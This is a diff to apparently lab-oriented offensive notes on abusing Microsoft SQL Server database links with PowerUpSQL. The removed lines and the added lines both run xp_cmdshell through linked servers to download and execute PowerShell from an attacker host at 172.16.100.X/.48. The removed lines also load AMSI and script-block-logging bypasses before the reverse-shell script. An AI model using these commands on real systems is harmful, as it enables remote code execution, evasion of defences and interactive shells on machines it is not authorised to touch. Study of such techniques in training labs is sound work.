@@ -37,7 +37,7 @@ Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -verbose
 **Gather Informatione**
 
 ```powershell
-Get-SqlInstnaceDomain | Get-SQLServerInfor -verbose
+Get-SqlInstanceDomain | Get-SQLServerInfor -verbose
 ```
 
 **Search for database Links**
@@ -64,12 +64,8 @@ select * from openquery(""nextHost",'select * from openquery("nexNextHost","sele
 **Executing commands**
 
 <pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell"><strong>Get-SQLServerLinkCrawl -instance mssqlhostname -query "exec master..xp_cmdshell 'whoami'"
-</strong><strong>
-</strong>Get-SQLServerLinkCrawl -instance mssqlhostname -query "exec master..xp_cmdshell 'powershell download cradle"
-<strong>
-</strong>Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''http:// 172.16.100.X/Invoke-PowerShellTcp.ps1'')"' –QueryTarget eu-sql
-<strong>
-</strong>Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(http:// 172.16.100.X/sbloggingbypass.ps1);iex (New-Object Net.WebClient).DownloadString(http:// 172.16.100.X/amsibypass.txt);iex (New-Object Net.WebClient).DownloadString(http:// 172.16.100.X/Invoke-powershelltcpex.ps1)"' –QueryTarget eu-sql
+</strong>
+Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://172.16.100.48/Invoke-PowerShellTcpEx.ps1)"'''
 <strong>
 </strong>//this runs accross all links
 => only for eu-sql we get an output
